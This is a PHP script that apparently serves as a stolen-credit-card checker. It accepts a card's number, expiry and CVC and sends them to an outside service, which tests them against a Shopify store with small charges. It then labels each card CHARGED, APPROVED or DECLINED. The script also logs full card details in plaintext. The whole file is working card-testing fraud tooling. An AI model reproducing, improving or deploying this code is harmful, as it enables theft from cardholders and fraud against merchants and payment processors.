<?php

// Include API key validation
require_once __DIR__ . '/validkey.php';
validateApiKey();

header('Content-Type: text/plain');

// Enable error reporting for debugging (disable in production)
ini_set('display_errors', 0);
error_reporting(E_ALL);

// Optional file-based logging for debugging (disable in production)
$log_file = __DIR__ . '/shopify1$_debug.log';
function log_message($message) {
    global $log_file;
    file_put_contents($log_file, date('Y-m-d H:i:s') . " - $message\n", FILE_APPEND);
}

// Function to check a single card via Shopify 1$ API with retry
function checkCard($card_number, $exp_month, $exp_year, $cvc, $retry = 1) {
    $card_details = "$card_number|$exp_month|$exp_year|$cvc";
    $encoded_cc = urlencode($card_details);
    $api_url = "https://rocks-mbs7.onrender.com/index.php?site=https://132461-96.myshopify.com&cc=$encoded_cc";
    log_message("Checking card: $card_details, URL: $api_url");

    for ($attempt = 0; $attempt <= $retry; $attempt++) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 50); // 50-second timeout as requested
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Insecure; enable in production

        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curl_error = curl_error($ch);
        $curl_errno = curl_errno($ch);
        curl_close($ch);

        log_message("Attempt " . ($attempt + 1) . " for $card_details: HTTP $http_code, cURL errno $curl_errno, Response: " . substr($response, 0, 100));

        // Handle API errors
        if ($response === false || $http_code !== 200 || !empty($curl_error)) {
            if ($curl_errno == CURLE_OPERATION_TIMEDOUT && $attempt < $retry) {
                log_message("Timeout for $card_details, retrying...");
                usleep(500000); // 0.5s delay before retry
                continue;
            }
            log_message("Failed for $card_details: $curl_error (HTTP $http_code, cURL errno $curl_errno)");
            return "DECLINED [API request failed: $curl_error (HTTP $http_code, cURL errno $curl_errno)] $card_details";
        }

        // Parse JSON response
        $result = json_decode($response, true);
        if (json_last_error() !== JSON_ERROR_NONE || !isset($result['Response'], $result['Status'])) {
            log_message("Invalid JSON for $card_details: " . substr($response, 0, 100));
            return "DECLINED [Invalid API response: " . substr($response, 0, 100) . "] $card_details";
        }

        // Map Shopify API response to status
        $response_text = $result['Response'];
        $status = 'DECLINED';
        if (in_array($response_text, ['Thank You', 'ORDER_PLACED'])) {
            $status = 'CHARGED';
        } elseif (in_array($response_text, ['INCORRECT_ZIP', 'INCORRECT_CVV', '3D_AUTHENTICATION', 'INSUFFICIENT_FUNDS'])) {
            $status = 'APPROVED';
        } elseif (in_array($response_text, [
            'CARD_DECLINED', 'FRAUD_SUSPECTED', 'r4 token empty', 'tax amount empty', 'del amount empty',
            'INCORRECT_NUMBER', 'product id empty', 'py id empty', 'clinte token', 'EXPIRED_CARD',
            'INVALID_PAYMENT_ERROR', 'AUTHORIZATION_ERROR', 'PROCESSING_ERROR'
        ])) {
            $status = 'DECLINED';
        }

        $response_msg = htmlspecialchars($response_text, ENT_QUOTES, 'UTF-8');
        log_message("$status for $card_details: $response_msg");
        return "$status [$response_msg] $card_details";
    }

    log_message("Failed after retries for $card_details");
    return "DECLINED [API request failed after retries] $card_details";
}

// Check if the request is POST and contains card data
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_POST['card']) || !is_array($_POST['card'])) {
    log_message("Invalid request or missing card data");
    echo "DECLINED [Invalid request or missing card data]";
    exit;
}

$card = $_POST['card'];
$required_fields = ['number', 'exp_month', 'exp_year', 'cvc'];

// Validate card data
foreach ($required_fields as $field) {
    if (empty($card[$field])) {
        log_message("Missing $field");
        echo "DECLINED [Missing $field]";
        exit;
    }
}

// Sanitize inputs
$card_number = preg_replace('/[^0-9]/', '', $card['number']);
$exp_month_raw = preg_replace('/[^0-9]/', '', $card['exp_month']);
$exp_year_raw = preg_replace('/[^0-9]/', '', $card['exp_year']);
$cvc = preg_replace('/[^0-9]/', '', $card['cvc']);

// Normalize exp_month to 2 digits
$exp_month = str_pad($exp_month_raw, 2, '0', STR_PAD_LEFT);
if (!preg_match('/^(0[1-9]|1[0-2])$/', $exp_month)) {
    log_message("Invalid exp_month format: $exp_month_raw");
    echo "DECLINED [Invalid exp_month format]";
    exit;
}

// Normalize exp_year to 4 digits
if (strlen($exp_year_raw) == 2) {
    $current_year = (int) date('y');
    $current_century = (int) (date('Y') - $current_year);
    $card_year = (int) $exp_year_raw;
    $exp_year = ($card_year >= $current_year ? $current_century : $current_century + 100) + $card_year;
} elseif (strlen($exp_year_raw) == 4) {
    $exp_year = (int) $exp_year_raw;
} else {
    log_message("Invalid exp_year format: $exp_year_raw");
    echo "DECLINED [Invalid exp_year format - must be YY or YYYY]";
    exit;
}

// Validate card number, year, and CVC
if (!preg_match('/^\d{13,19}$/', $card_number)) {
    log_message("Invalid card number format: $card_number");
    echo "DECLINED [Invalid card number format]";
    exit;
}
if (!preg_match('/^\d{4}$/', (string) $exp_year) || $exp_year > (int) date('Y') + 10) {
    log_message("Invalid exp_year after normalization: $exp_year");
    echo "DECLINED [Invalid exp_year format or too far in future]";
    exit;
}
if (!preg_match('/^\d{3,4}$/', $cvc)) {
    log_message("Invalid CVC format: $cvc");
    echo "DECLINED [Invalid CVC format]";
    exit;
}

// Validate logical expiry
$expiry_timestamp = strtotime("$exp_year-$exp_month-01");
$current_timestamp = strtotime('first day of this month');
if ($expiry_timestamp === false || $expiry_timestamp < $current_timestamp) {
    log_message("Card expired: $card_number|$exp_month|$exp_year|$cvc");
    echo "DECLINED [Card expired] $card_number|$exp_month|$exp_year|$cvc";
    exit;
}

// Check single card
echo checkCard($card_number, $exp_month, $exp_year, $cvc);
?>
